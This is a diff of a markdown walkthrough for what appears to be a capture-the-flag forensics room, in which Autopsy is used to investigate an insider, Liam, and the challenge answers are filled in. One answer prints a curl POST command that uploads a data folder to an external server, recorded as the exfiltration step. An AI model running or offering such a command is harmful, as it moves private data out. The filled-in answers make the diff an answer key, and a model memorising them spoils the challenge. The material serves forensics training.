@@ -61,17 +61,55 @@ To use Autopsy, open a terminal and navigate to <code>/home/ubuntu/autopsy/autop
 
 <br>
 
+<p>Here is <code>Liam´s disk image</code>: <code>/home/ubuntu</code>.</p>
+<br>
+
+![image](https://github.com/user-attachments/assets/3ddbe1eb-6999-4ccc-90eb-49d9bb63d30c)
+
+<br>
+
+<p>Here is <code>Autopsy</code>.</p>
+<br>
+
+![image](https://github.com/user-attachments/assets/7fb30c43-0221-471c-8ef3-c8222dddcd71)
+
+
+<br>
+
+<p>Let´s start launching <code>Autopsy</code>, selecting <code>Open Recent Case</code> and clicking <code>Open</code>.</p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/c059b8c8-8e0b-4cc3-8a45-c620473db4c7)
+
+<br>
+
+2025-03-19 09:07:41
+
+
+
+
 > 1.2. <em>What was the timezone of Liam’s device?</em><br><a id='1.2'></a>
 >> <strong><code>__</code></strong><br>
 <p></p>
 
 <br>
 
+![image](https://github.com/user-attachments/assets/5093b1b4-2016-46c7-bc00-6faf42e5d51c)
+
+<br>
+
+
 > 1.3. <em>What is the serial number of the USB that was inserted by Liam?</em><br><a id='1.3'></a>
->> <strong><code>__</code></strong><br>
+>> <strong><code>2651931097993496666</code></strong><br>
 <p></p>
 
 <br>
+
+![image](https://github.com/user-attachments/assets/4ce7f42e-2fc2-4e80-90c3-5d74ef33ec6d)
+
+<br>
+
 
 > 1.4. <em>When was the USB connected to the system? (Format: YYYY-MM-DD HH:MM:SS)</em><br><a id='1.4'></a>
 >> <strong><code>__</code></strong><br>
@@ -80,32 +118,58 @@ To use Autopsy, open a terminal and navigate to <code>/home/ubuntu/autopsy/autop
 <br>
 
 > 1.5. <em>What command was executed when Liam ran 'transferfiles'?</em>Hint : <em>Liam was smart. He used a nickname for his long command. Where could have he placed this command?</em><br><a id='1.5'></a>
->> <strong><code>__</code></strong><br>
+>> <strong><code>cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documents/Data</code></strong><br>
 <p></p>
 
 <br>
 
-> 1.6. <em>What command did Liam execute to transfer the exfiltrated files to an external server?</em><br><a id='1.6'></a>
->> <strong><code>__</code></strong><br>
+![image](https://github.com/user-attachments/assets/a509841c-96a6-477e-a5d3-985d28a860eb)
+
+<br>
+
+
+> 1.6. <em>What command did Liam execute to transfer the exfiltrated files to an external server?</em>Hint : <em>Liam was smart. He used a nickname for his long command. Where could have he placed this command?</em><br><a id='1.6'></a>
+>> <strong><code>curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload</code></strong><br>
 <p></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/d2dba395-2af3-4e74-b407-3fd0c28067d1)
 
 <br>
 
 > 1.7. <em>What is the IP address of the domain to which Liam transferred the files to?</em><br><a id='1.7'></a>
->> <strong><code>__</code></strong><br>
+>> <strong><code>5.45.102.93</code></strong><br>
 <p></p>
 
 <br>
 
+![image](https://github.com/user-attachments/assets/dd185680-dfd8-43cf-b8cf-ca73b4d98159)
+
+
+
+<br>
+
+
 > 1.8. <em>Which directory was the user in when they created the file 'mth'?</em><br><a id='1.8'></a>
->> <strong><code>__</code></strong><br>
+>> <strong><code>/home/liam</code></strong><br>
 <p></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/71465bfe-a60a-4978-86bb-3f4a23d5ad3a)
+
 
 <br>
 
 > 1.9. <em>Remember Henry, the external entity helping Liam during the exfiltration? What was the amount in USD that Henry had to give Liam for this exfiltration task?</em><br><a id='1.9'></a>
->> <strong><code>__</code></strong><br>
+>> <strong><code>10000</code></strong><br>
 <p></p>
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/1a75ed7f-bec9-4730-bf90-2df1533ffcb1)
 
 <br>
 
@@ -116,8 +180,13 @@ To use Autopsy, open a terminal and navigate to <code>/home/ubuntu/autopsy/autop
 <br>
 
 > 1.11. <em>There is a .hidden/ folder that Liam listed the contents of in his commands. What is the full path of this directory?</em><br><a id='1.11'></a>
->> <strong><code>__</code></strong><br>
+>> <strong><code>/home/liam/Public</code></strong><br>
 <p></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/b9723798-599e-4ab6-bf3a-85c0a27b5916)
+
 
 <br>
 
